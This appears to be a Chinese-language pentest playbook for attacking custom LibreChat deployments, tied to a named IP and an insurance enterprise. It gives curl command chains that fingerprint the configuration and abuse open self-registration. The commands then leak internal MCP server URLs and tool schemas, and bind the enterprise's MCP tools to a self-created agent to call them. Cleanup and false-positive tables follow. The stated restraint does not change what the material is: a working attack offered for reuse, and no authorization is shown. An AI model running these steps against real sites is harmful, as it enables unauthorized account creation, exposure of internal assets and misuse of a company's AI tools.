# LibreChat 定制 fork：自助开号 → 内部 MCP 工具面泄露（实战卡）

> 来源：`20.114.162.114`（保险企业定制 LibreChat，Empower Product Hub + OIPA），2026-09-22 实测。
> 适用：拿到任何 **LibreChat** 站点（标题/`/api/config` 特征）时的完整判定链。
> 纪律：只 GET；注册仅用于打通"外部人可达性"，用完即删；**不绕目标风控（429 就等窗口，不换 IP）**。

---

## 1. 判族（未授权，3 个请求）

```bash
curl -s http://T/api/config | jq '{registrationEnabled,emailEnabled,passwordResetEnabled,ldap,serverDomain}'
curl -s http://T/api/endpoints | jq .        # 端点与 userProvide（false=密钥在平台侧）
curl -s http://T/api/models  | jq -r 'to_entries[0].value|length'
```
`/api/config` 能回 JSON 且带 `registrationEnabled` ⇒ LibreChat。**`serverDomain` 必须记下来**（真 vhost 可能与 IP 不同）。

**关键判据表**

| 配置组合 | 含义 |
|---|---|
| `registrationEnabled:true` + `emailEnabled:true` | 注册要收验证邮件 ⇒ 需要可控邮箱（临时邮箱收码） |
| **`registrationEnabled:true` + `emailEnabled:false`** | **★ 注册门大开**：验证邮件发不出、也不强制校验 ⇒ 注册即可登录 |
| `passwordResetEnabled:true` + `emailEnabled:false` | 危险组合（重置链发不出信）⇒ 顺手测 `requestPasswordReset` 是否吐 token（标准防枚举文案=判负） |
| `ldap.enabled:true` | 转 LDAP 面（空密码/匿名绑定） |

## 2. 注册可达性：**路由存在性 oracle**（不猜路径）

同一路径的四种回包，含义完全不同——**先分类再动手**：

| 回包 | 含义 |
|---|---|
| `400/422` + `xxx: Required` 字段校验 | **路由真实存在**，且字段被错误信息交代 |
| `404 {"message":"Endpoint not found"}` | 该 fork 的"路由不存在"（比 405 更常见） |
| `200` + 600 字节左右 HTML | **SPA 兜底** ⇒ 路由**没挂**（配置宣称的开放注册是空头支票） |
| `405` + `Allow: POST` | 路由在，方法不对 |

实战差异（8 台 LibreChat 同族）：
- 某些部署 `/api/auth/*` **整子树 SPA 兜底** ⇒ 别被 `registrationEnabled:true` 骗；
- 某些被改成**多要一个邀请码字段**（如 `lab_code`）⇒ 填一次无效值看文案（`lab_code: Lab code error.`）**即判负，不爆破**；
- 某些**真开放**：`register` → `login` 直接给 token。

**bundle 里的 70 条 `/api/auth/*` 契约 ≠ 服务器真挂**：`curl /assets/*.js` 抠出的路径只是前端声明。**永远以服务器回包为准**。
（注意：资产文件名带 hash，部署热更后旧名会退化成 index.html 兜底 —— 长度突然变成 ~4.9KB 就是被重建了，别当成 WAF。）

## 3. 认证后的三个"金矿"端点（本例全部只需 `role:USER`）

```bash
TOK=$(curl -s -XPOST http://T/api/auth/login -H 'Content-Type: application/json' \
      -d '{"email":"<your-marked>@example.com","password":"<pw>"}' | jq -r .token)

curl -s http://T/api/mcp/servers           -H "Authorization: Bearer $TOK"   # ① 内部 MCP 服务器 + 内网 URL
curl -s http://T/api/mcp/tools             -H "Authorization: Bearer $TOK"   # ② 工具全表 + 完整参数 schema
curl -s http://T/api/mcp/connection/status -H "Authorization: Bearer $TOK"   # ③ 连接态/服务器名
```
- ①②③ **免鉴权一律 401**（8/8 台实测）⇒ **泄露必须持账号**；所以"能不能自助开号"决定这条链成不成立。
- ① 吐出的往往是 `-vnet-`/内网域名（本例 `...-mcp-vnet.<env>.eastus2.azurecontainerapps.io`）：**先 `getent hosts`/`nslookup` 判公网可达性**——解析失败 ⇒ 只能经平台服务端代理（如实判负，别吹"可直接打内网"）。
- ② 的 `authenticated:true` = **调用凭据由 LibreChat 服务端持有**，外部用户零凭据。**工具名里凡是 `edit_*` / `bulk_update_*` / `delete_*` 就是写面 —— 测试时只碰读工具。**

## 4. 升级：把企业 MCP 工具绑进自己的 Agent（本例实锤"绑定被接受"）

```bash
curl -s -X POST http://T/api/agents -H "Authorization: Bearer ***" \
  -H 'Content-Type: application/json' \
  -d '{"name":"pntest-agent","provider":"<provider>","model":"<model>",
       "tools":["<tool>_mcp_<server>"]}'          # → 201 {"id":"agent_...","tools":[...]}
# 对话：POST 只回 streamId，正文在独立 SSE 流上（★ messageId 必须是【字符串】UUID）
curl -s -X POST http://T/api/agents/chat -H "Authorization: Bearer ***" \
  -H 'Content-Type: application/json' \
  -d '{"text":"Use the <tool> tool ...","conversationId":null,
       "parentMessageId":"00000000-0000-0000-0000-000000000000","messageId":"<uuid4 字符串>",
       "endpoint":"agents","agent_id":"agent_...","model":"<model>",
       "isCreatedByUser":true,"error":false}'
# → 200 {"streamId":"<sid>","conversationId":"<sid>","status":"started"}
curl -s -N "http://T/api/agents/chat/stream/<sid>" \
  -H "Authorization: Bearer ***" -H 'Accept: text/event-stream'    # ← 取真正文/工具调用
```
- `pluginKey` 形如 `search_products_mcp_empower-product-hub`（② 的 `pluginKey` 字段直接抄）。
- **本 fork 没有 `/api/ask/:endpoint`、`/api/edit/:endpoint`（均 404）**；旁证：`GET /api/agents/stream/<sid>`、`GET /api/ask/agents/stream/<sid>` 均 **404 Endpoint not found**，`POST /api/agents/chat/<sid>` **500 "Failed to validate agent access permissions"**。
- **绑定 ≠ 能执行（实测判负）**：本例 `POST /api/agents` **201 ×3 次都成功**（服务端确实接受外部人声明企业 MCP 工具），但取 SSE 流立刻回
  `event: error  data: {"error":"{ \"type\": \"illegal_model_request\", \"info\": \"Databricks|gpt-5.4\" }"}`
  ⇒ **模型层被平台配置拒绝，工具根本没跑**。没有模型就没有工具调用 ⇒ 本条定性 **P1（权限/配置缺陷 + 内部资产拓扑泄露），不是 P0**。
- **不要为了"打通"去逐模型试错**：允许清单外的模型名不可猜，反复开号试 = 无依据猜测 + 反复触发注册限速、违背最小足迹。**判负就判负**，并写明"未穷尽"。 

## 5. 归零（**顺序是纪律，别搞反**）

```bash
curl -s -XDELETE http://T/api/agents/<id>    -H "Authorization: Bearer $TOK"   # ① 先删子对象
curl -s -XDELETE http://T/api/convos/<cid>   -H "Authorization: Bearer $TOK"   # ② 再删对话
curl -s -XDELETE http://T/api/user/delete    -H "Authorization: Bearer $TOK"   # ③ 最后删账号（注意是 /api/user/delete）
curl -s http://T/api/user -H "Authorization: Bearer $TOK"                      # → 401 复查
curl -s -XPOST http://T/api/auth/login ... -d '{"email":"<marked>",...}'       # → 404 {"message":"Email does not exist."}
```
> **血泪点**：先删账号会把 Agent 变成**作者已消失的孤儿对象**（删不干净、也无法再以原身份删除）。任何"创建子对象"的动作都要在删号前逐项清。

> **血泪点 2（脚本健壮性，我真实付过代价）**：
> ① **归零必须包在 `try/finally`**——本例 `"messageId": uuid4()` 把 UUID **对象**塞进 `json.dumps`，异常发生在归零**之前**，当场留下 1 个账号 + 1 个 Agent；且脚本**没打印随机邮箱** ⇒ **永久失去自清能力**，只能转交目标方。
> ② ⇒ **随机生成的账号/邮箱/密码必须在脚本第 1 行就 emit 出来**，并同时落远端文件（`emit()` 写 stdout + `/root/jxck/<name>.out`），事后可 `fetch` 回来。
> ③ 判读远端输出**不要只 grep 自己约定的标签**（`^(###|[A-Z]|)`）——那会把 `Traceback` 一起滤掉，把"脚本崩了"误读成"卡在下一步"。

## 6. 风控事实（如实记录，别绕）

- 注册有 **IP 级限速**：约第 5 个账号起 `429 {"message":"Too many accounts created, please try again after 60 minutes"}`。
- **不换跳板机 IP 去续开号** —— 那是规避目标风控，违背最小足迹。等窗口，或用**同一个账号**把该做的做完。

## 7. 常见假阳性/误判

| 现象 | 正解 |
|---|---|
| `/api/models` 返 37 个模型（含 gpt-5.4 全家） | LibreChat **内置默认模型表** ⇒ **不证明 key 可用**。本例已**实测证伪**：`/api/agents/chat` 立马回 `illegal_model_request (Databricks\|gpt-5.4)` ⇒ 一个都用不上 |
| `/api/endpoints` `userProvide:false` | 只证明"配置说密钥在平台侧" ⇒ **要坐实必须实发一次最小调用**；本例实发后被模型层拒 ⇒ **不写"已白嫖"** |
| `/api/agents` 返 `201` + `tools:[...]` | 只证明"**绑定被接受**"（配置/权限缺陷，P1）⇒ **不等于工具会被执行**；必须取 SSE 流看真实回包才算打通 |
| `POST /api/agents/chat` 返 `{"status":"started"}` | 这只是**受理回执**，正文在 `GET /api/agents/chat/stream/<streamId>` ⇒ 不取流就别下结论 |
| 资产请求突然只回 4.9KB | 部署被重建/热更，资产名失效 ⇒ 不是 WAF |
| IP vhost 与真域名 vhost 回包不同 | 两个都要打（`/api/auth/*` 可能只在真 vhost 挂） |
| 远端脚本输出"卡在某一步" | 先怀疑**自己的脚本抛异常被 grep 滤掉**（本例 `uuid4()` 对象进 `json.dumps`）⇒ 去掉标签过滤再看原文 |
